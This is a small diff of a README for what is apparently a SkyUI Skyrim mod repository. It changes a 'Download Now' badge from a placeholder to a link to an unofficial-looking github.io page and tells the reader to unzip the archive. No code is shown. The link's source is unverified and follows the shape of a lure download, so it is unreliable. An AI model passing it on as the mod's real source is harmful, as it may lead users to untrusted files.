@@ -6,7 +6,7 @@ SkyUI is a fan-favorite Skyrim mod designed to modernize and improve the game’
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://skyui-skyrim-mod.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
